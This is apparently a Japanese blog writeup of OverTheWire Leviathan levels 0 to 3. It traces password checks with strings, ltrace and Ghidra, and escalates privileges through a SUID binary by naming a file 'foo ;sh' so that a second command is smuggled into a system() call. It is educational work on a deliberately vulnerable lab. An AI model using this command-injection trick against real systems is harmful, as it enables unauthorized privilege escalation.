---
title: OverTheWire 「Leviathan | Level 0 -> 3」Writeup
description: OverTheWire Leviathan Level 0〜3 のwriteup．strings と ltrace でのパスワード比較の解析，Ghidra によるデコンパイル，SUIDバイナリの OS コマンドインジェクションを利用
date: 2026-05-16 15:45:00 +0900
categories: [CyberSecurity, CTF]
tags: [overthewire, rev]
---

> [OverTheWire leviathan](https://overthewire.org/wargames/leviathan/)

## Level 0 -> 1

```shell
$ ssh -p 2223 leviathan0@leviathan.labs.overthewire.org

leviathan0@leviathan:~$ la
.backup  .bash_logout  .bashrc  .profile

leviathan0@leviathan:~$ cd .backup/

leviathan0@leviathan:~/.backup$ la
bookmarks.html

leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is <confidential>" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

## Level 1 -> 2

```shell
$ ssh -p 2223 leviathan0@leviathan.labs.overthewire.org

leviathan1@leviathan:~$ la
.bash_logout  .bashrc  check  .profile

leviathan1@leviathan:~$ file check
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5222b367f5b1ff23a8b2d18696bf508c8c8c0e82, for GNU/Linux 3.2.0, not stripped

leviathan1@leviathan:~$ checksec --file=check
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   44 Symbols        No    0      1check

leviathan1@leviathan:~$ strings check
#...
printf
setreuid
strcmp
geteuid
libc.so.6
GLIBC_2.4
GLIBC_2.34
GLIBC_2.0
__gmon_start__
secr
love
password:
/bin/sh
Wrong password, Good Bye ...
;*2$"0
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
#...

leviathan1@leviathan:~$ ./check
password: 123
Wrong password, Good Bye ...
```

**strings** コマンドの出力に `strcmp` があり，`password:` に入力した文字列を比較していると推測します．
**strings** では比較対象の文字列を取得できなかったので，**ltrace** を用います．

このプログラムは，入力の先頭3文字を切り出して，文字列と比較していることがわかりました．

```shell
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x80490ed, 1, 0xffffd474, 0 <unfinished ...>
printf("password: ")                                                      = 10
getchar(0, 0, 0x786573, 0x646f67password: test
)                                         = 116
getchar(0, 116, 0x786573, 0x646f67)                                       = 101
getchar(0, 0x6574, 0x786573, 0x646f67)                                    = 115
strcmp("tes", "<confidential>")                                                      = 1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                      = 29
+++ exited (status 0) +++

leviathan1@leviathan:~$ ./check
password: <confidential>

$ whoami
leviathan2

$ cat /etc/leviathan_pass/leviathan2
```

### ltrace とは

実行ファイルが呼び出している **ライブラリ関数** をトレースして表示するツールです．
プログラムが実行中に呼び出す共有ライブラリ (主に `libc` など) の関数 (`printf`, `strcmp`, `malloc`, `fopen` など) を監視し，その **引数と戻り値** を **標準エラー出力(2)** に表示します．

## Level 2 -> 3

```shell
$ ssh -p 2223 leviathan2@leviathan.labs.overthewire.org

leviathan2@leviathan:~$ ll
total 36
drwxr-xr-x   2 root       root        4096 Apr  3 15:19 ./
drwxr-xr-x 150 root       root        4096 Apr  3 15:20 ../
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Apr  3 15:10 .bashrc
-r-sr-x---   1 leviathan3 leviathan2 15076 Apr  3 15:19 printfile*
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile

leviathan2@leviathan:~$ file printfile
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=efe166cf833ba66423e2645c81c3c30c1049439a, for GNU/Linux 3.2.0, not stripped

leviathan2@leviathan:~$ checksec --file=printfile
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   44 Symbols        No    0      2printfile

leviathan2@leviathan:~$ strings printfile
tdX
/lib/ld-linux.so.2
_IO_stdin_used
snprintf
puts
__stack_chk_fail
system
__libc_start_main
access
setreuid
geteuid
libc.so.6
GLIBC_2.4
GLIBC_2.0
GLIBC_2.34
__gmon_start__
*** File Printer ***
Usage: %s filename
You cant have that file...
/bin/cat %s
;*2$"0
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
#...
```

`printfile <filename>` というようにすれば，`/bin/cat` でそのファイルの内容を出力してくれるプログラムのようです．直接，`/etc/leviathan_pass/leviathan3` を読み出すことはできなかったため，**ltrace** で調べます．ghidraで解析するため，scpでローカルにバイナリを飛ばしておきます．

```shell
$ scp -P 2223 leviathan2@leviathan.labs.overthewire.org:/home/leviathan2/printfile ./

leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...

leviathan2@leviathan:~$ ltrace ./printfile .bash_logout
__libc_start_main(0x80490ed, 2, 0xffffd464, 0 <unfinished ...>
access(".bash_logout", 4)                                                 = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")     = 21
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
```

**Ghidraでのデコンパイル結果**
```c
undefined4 main(int param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  __uid_t __euid;
  __uid_t __ruid;
  int in_GS_OFFSET;
  char local_214 [512];
  int local_14;
  undefined4 *local_10;
  
  puVar1 = param_2;
  local_10 = &param_1;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (param_1 < 2) {
    puts("*** File Printer ***");
    printf("Usage: %s filename\n",*puVar1);
    uVar2 = 0xffffffff;
  }
  else {
    iVar3 = access((char *)param_2[1],4);
    if (iVar3 == 0) {
      snprintf(local_214,0x1ff,"/bin/cat %s",puVar1[1]);
      __euid = geteuid();
      __ruid = geteuid();
      setreuid(__ruid,__euid);
      system(local_214);
      uVar2 = 0;
    }
    else {
      puts("You cant have that file...");
      uVar2 = 1;
    }
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar2;
}
```

`snprintf(command, sizeof(command), "/bin/cat %s", argv[1]);` の部分で，`argv[1]` を読み込んでいます．もし，引数にコマンドを入力すれば，**SUID** が設定されているこのバイナリでは，所有者である **leviathan3** ユーザで処理が実行される **OS Command Injection** が発生します．

**デコンパイル結果から復元したmain()**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

// argc: 引数の数 (argument count), argv: 引数の内容の文字列配列 (argument vector)
int main(int argc, char *argv[]) {
	char command[512];
    uid_t euid;
    uid_t ruid;

    // 引数が足りない場合 (プログラム名のみ，または引数なし)
    if (argc < 2) {
        puts(" File Printer ");
        printf("Usage: %s filename\n", argv[0]);
        return -1; // int型では -1
    }

    // 指定されたファイルへの読み込み権限 (R_OK = 4) があるかチェック
    if (access(argv[1], R_OK) == 0) {
        // 実行するコマンド文字列を作成: /bin/cat <ファイル名
        snprintf(command, sizeof(command), "/bin/cat %s", argv[1]);

        // 権限の取得と設定
        euid = geteuid();
        ruid = geteuid();
        setreuid(ruid, euid);

        // コマンドを実行
        system(command);
        return 0;
    } 
    else {
        // 読み込み権限がない，またはファイルが存在しない場合
        puts("You cant have that file...");
        return 1;
    }
}
```

そこで，ファイル名に空白を含むファイル (`foo ;sh`) を作成します．

1. **`access()` のチェック時**:
    - 引数として `foo ;sh` という1つの文字列が渡されます．
    - ファイルが実在するので，**チェックを無事通過**します．
2. **`system()` での実行時**:
    - `snprintf` によって，以下のコマンド文字列が作られます．
      `/bin/cat foo ;sh`
    - これがシェルに渡されると，シェルはスペースとセミコロンでコマンドを分解します．
        - コマンド1: `/bin/cat foo` (ファイル `foo` は存在しないのでエラーになりますが，プログラムは止まりません)
        - コマンド2: **`sh`**

```shell
leviathan2@leviathan:~$ mktemp -d
/tmp/tmp.TbuSzV02iO

leviathan2@leviathan:/tmp/tmp.TbuSzV02iO$ touch "foo ;sh"

leviathan2@leviathan:/tmp/tmp.TbuSzV02iO$ ~/printfile foo\ \;sh
/bin/cat: foo: Permission denied

$ whoami
leviathan3

$ cat /etc/leviathan_pass/leviathan3
```

## Level 3 -> 4

```shell
$ ssh -p 2223 leviathan2@leviathan.labs.overthewire.org

leviathan3@leviathan:~$ ll
total 40
drwxr-xr-x   2 root       root        4096 Apr  3 15:19 ./
drwxr-xr-x 150 root       root        4096 Apr  3 15:20 ../
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Apr  3 15:10 .bashrc
-r-sr-x---   1 leviathan4 leviathan3 18100 Apr  3 15:19 level3*
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile

leviathan3@leviathan:~$ file level3
level3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=42cd25dff7ae31fed05c86fa42e09963e8086dc8, for GNU/Linux 3.2.0, with debug_info, not stripped

leviathan3@leviathan:~$ checksec --file=level3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   47 Symbols        No    0      2level3
```

入力した文字列が一致していればシェルが返るようです．

```shell
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x80490ed, 1, 0xffffd474, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                = -1
printf("Enter the password> ")                                            = 20
fgets(Enter the password>
"\n", 256, 0xf7fab5c0)                                              = 0xffffd24c
strcmp("\n", "<confidential>\n")                                               = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                = 19
+++ exited (status 0) +++
```

```shell
leviathan3@leviathan:~$ ./level3
Enter the password> <confidential>
[You've got shell]!

$ whoami
leviathan4

$ cat /etc/leviathan_pass/leviathan4
```